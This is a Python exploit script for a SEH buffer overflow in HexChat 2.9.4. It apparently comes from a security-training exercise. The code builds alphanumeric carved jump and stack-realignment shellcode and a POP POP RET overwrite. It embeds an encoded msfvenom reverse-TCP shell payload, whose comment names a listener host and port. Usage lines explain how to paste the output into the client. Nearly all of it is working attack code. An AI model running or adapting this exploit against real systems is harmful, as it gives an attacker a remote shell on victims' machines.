#!/usr/bin/env python3

# HexChat 2.9.4 SEH 
#   Tyler Boykin (OS-40299)
#
#   This was a time trial and took me around 10 hours, which is a drastic improvement from before.
#   It even incorporates shellcode carving, stack realignment, SEH/NSEH, alpha numeric opcodes, etc.
#
#   Resources and tools used in this include
# Slink: For quick alpha numeric carving (https://github.com/ihack4falafel/Slink)
#   |_ (The sections that feature EAX being zeroe'd and then sub'd/add'd to put in custome opcodes. )
# The following guides for references and sanity checking myself:
#   |_  https://www.mattandreko.com/2013/04/06/buffer-overflow-in-hexchat-2.9.4/
#   |_  https://medium.com/ethical-hacking-blog/alphanumeric-encoding-of-shellcode-40eb2e69a2d6
#   |_  https://www.exploit-db.com/exploits/24919


# Usage: 
#   ./hexchat_2.9.4_seh.py > hexchat_boom.txt
#   (paste the contents into the window command area)

from struct import pack
import sys

def p(x):
    return pack('<I',x)

pop_pop_ret_1 = p(0x6D715D45)

## Phase three... carve jmp to ebp, sick air jump
jmp_ebp_carve = ""
jmp_ebp_carve += "\x54"
jmp_ebp_carve += "\x58"
jmp_ebp_carve += "\x05\x46\x55\x55\x55"
jmp_ebp_carve += "\x05\x46\x55\x55\x55"
jmp_ebp_carve += "\x05\x46\x55\x55\x55"
jmp_ebp_carve += "\x50"
jmp_ebp_carve += "\x5c"
jmp_ebp_carve += "\x25\x4A\x4D\x4E\x55"
jmp_ebp_carve += "\x25\x35\x32\x31\x2A"
jmp_ebp_carve += "\x05\x77\x63\x41\x41"
jmp_ebp_carve += "\x05\x66\x53\x41\x41"
jmp_ebp_carve += "\x05\x55\x62\x41\x41"
jmp_ebp_carve += "\x2D\x33\x33\x33\x33"
jmp_ebp_carve += "\x50"
jmp_ebp_carve += "\x55"
jmp_ebp_carve += "\x58"
jmp_ebp_carve += "\x66\x05\x50\x01"
jmp_ebp_carve += "\x66\x05\x50\x01"
jmp_ebp_carve += "\x66\x05\x50\x01"
jmp_ebp_carve += "\x50"
jmp_ebp_carve += "\x5D"
jmp_ebp_carve += "HHw\x06"

## Phase one... align stack and get back
backup = ""
backup += "\x54"
backup += "\x58"
backup += "\x04\x04"
backup += "\x04\x04"
backup += "\x50"
backup += "\x5c\x5c"
backup += "\x66\x05\x70\x1c"
backup += "\x66\x05\x70\x1c"
backup += "\x50"
backup += "\x5c"
backup += "\x25\x4A\x4D\x4E\x55"
backup += "\x25\x35\x32\x31\x2A" 
backup += "\x05\x76\x40\x50\x50" 
backup += "\x05\x75\x40\x40\x40" 
backup += "\x50"                

## Phase two... re-align and get a bigger jump back
backup2 = ""
backup2 += "\x54"
backup2 += "\x58"
backup2 += "\x05\x3d\x55\x55\x55"
backup2 += "\x05\x3d\x55\x55\x55"
backup2 += "\x05\x3d\x55\x55\x55"
backup2 += "\x50"
backup2 += "\x5c"
backup2 += "\x25\x4A\x4D\x4E\x55"
backup2 += "\x25\x35\x32\x31\x2A"
backup2 += "\x05\x76\x40\x50\x50"
backup2 += "\x05\x75\x40\x40\x40" 
backup2 += "\x50"               

OFFSET = 13336  #___OVERALL SECTION LENGTH
TMP_ZONE = 69   #___BETWEEN BACK UP1 AND 2
TMP_ZONE2 = 20  #___BETWEEN BACK UP2 AND BIG JMP
TAIL = 656      #___CABOOSE AT THE END

head_offset = 13141 #___JUST THE FRONT PART BEFORE THE OVERWRITE

#msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=192.168.102.46 LPORT=123 -e x86/alpha_mixed BufferRegister=EBP
buf = "DDD\x04\x09P]UYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIIlxhnbgpc0uPSPmYhevQIPCTnkv0TpLKV24LNk3bdTlKcBdhfoH70JwVEa9ollGLPa1l6bfLEpzahO4MFaXGirHr1BV7lKPRtPlKSzUlLK0L7a48M3RhC1zqV1nk2ygPUQXSnkpIr8isGJSyNkGDnk31kfVQionLkqjoVmUQxGdxM0bUyfWs1mKHEkCM141ekTV8LKShwTvaZspflKdL2knkRxGlgqN3lK6dnks1xPk9PD14fDCk1KqqaIBzF19oYp1Oco1JlK22hkNmaM1xUcp2WpGpe8pwPs6R3oPTSXblpw5vc7YoHUoHZ0UQUPgpdiHDrtPPRHVIK0BKuP9okebpPPPPbp70rpQPv0cX9zvoIOm0YoHUJ7bJ6eu8o0i82FFNphfbWps0qkk9Yvqz6psf3g2HoiLeQdaqyoZuK5YP2TVl9opNuXSEhlRHhpnUoRQF9ohUU8QsBMCTuPNi8crwbw2wfQXvcZgbaIpVM29mcVO71Tddelfavanm2dfDb0hFgpW40TRp3fv6f6g6sf2ncfV6F3SfU8QixLuoOvioxUmYkPPNV6QV9oVPsXwxMWeM50kOKeOKJPnU92Rv58LfnuoMomkOke5lWvqlwzopykypsEUUMkCwGccBROrJs0F3ioZuAA"

exploit = ""
exploit += "/server "                       #___REQUIRED TO HAVE
#exploit += "A" * ((OFFSET - TMP_ZONE - TMP_ZONE2 - len(backup2) - len(jmp_ebp_carve)) + 48)
exploit += "A" * 44                         #___OFFSET FROM THE START
exploit += buf                              #___THE GOOD STUFF
exploit += "A" * (head_offset - len(buf))   #___FILLER BETWEEN BIG JMP AND BUF
exploit += jmp_ebp_carve                    #___THE BIG JUMP TO THE PAYLOAD
exploit += "A" * (TMP_ZONE2 - 4 )           #___FILLER BETWEEN 
exploit += backup2                          #___SLIGHTLY BIGGER JUMP UP THE STACK
exploit += "A" * (TMP_ZONE - len(backup2) - 4)#_FILLER BETWEEN SHORT JMP2 AND OVERWRITE
exploit += 'HHw\x04'                        #___CONDITIONAL HOP OVER 
exploit += 'E]qm'                           #___POP POP RET
exploit += backup                           #___SHORT JUMP BACK UP THE STACK
exploit += "A" * (TAIL - len(backup))       #___CABOOSE


print(exploit)
